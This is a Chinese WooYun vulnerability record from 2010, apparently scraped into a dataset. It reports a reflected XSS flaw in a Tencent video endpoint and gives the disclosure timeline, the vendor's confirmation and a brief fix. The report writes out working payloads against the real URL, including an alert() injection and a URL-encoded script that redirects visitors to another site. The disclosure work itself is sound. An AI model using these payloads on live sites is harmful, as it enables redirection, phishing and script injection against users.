{"id": 24106, "wybug_id": "wooyun-2010-0342", "wybug_title": "腾讯某频道XSS漏洞", "wybug_corp": "腾讯", "wybug_author": "Jannock", "wybug_date": "2010-08-28 13:38", "wybug_open_date": "2010-09-27 15:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "上下文", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-08-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2010-08-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2010-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2010-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2010-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2010-09-27：\t细节向公众公开  简要描述： 由于把传入的参数直接写在js 代码里面，造成xss漏洞 详细说明：  http://cgi.video.qq.com/v1/user/userinfo?u=611991217;alert(/ss/)查看源码：\t<script>\tvar mh_pageName = \"user/userinfo?u=611991217;alert(/ss/)\";\tvar m_type = 0;\tvar mh_cuin = 611991217;alert(/ss/) ;\t</script>由于编码处理了 ' \" 等符号，但依然可以通过URL传值。如：http://cgi.video.qq.com/v1/user/userinfo?u=611991217;var str=window.location.href;var es=/url=/;es.exec(str);var right=RegExp.rightContext;window.location.href=right&url=http://www.hao123.com编码参数后即：http://cgi.video.qq.com/v1/user/userinfo?u=%36%31%31%39%39%31%32%31%37%3B%76%61%72%20%73%74%72%3D%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%3B%76%61%72%20%65%73%3D%2F%75%72%6C%3D%2F%3B%65%73%2E%65%78%65%63%28%73%74%72%29%3B%76%61%72%20%72%69%67%68%74%3D%52%65%67%45%78%70%2E%72%69%67%68%74%43%6F%6E%74%65%78%74%3B%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%3D%72%69%67%68%74&url=http://www.hao123.com会自动转到 http://www.hao123.com,或其他方式利用，利用已引入的js。还存在一个奇怪的问题，就是输入这样的：http://cgi.video.qq.com/v1/user/userinfo?u=611991217;window.location.href=0x12会出现CGI错误：An error occured:CGIException   漏洞证明：  http://cgi.video.qq.com/v1/user/userinfo?u=611991217;alert(/ss/)http://cgi.video.qq.com/v1/user/userinfo?u=%36%31%31%39%39%31%32%31%37%3B%76%61%72%20%73%74%72%3D%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%3B%76%61%72%20%65%73%3D%2F%75%72%6C%3D%2F%3B%65%73%2E%65%78%65%63%28%73%74%72%29%3B%76%61%72%20%72%69%67%68%74%3D%52%65%67%45%78%70%2E%72%69%67%68%74%43%6F%6E%74%65%78%74%3B%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%3D%72%69%67%68%74&url=http://www.hao123.com   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2010-08-30 09:51 厂商回复： thanks 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-07 16:05 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  思路好 总结xss写入js编码 考虑自己绕过    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}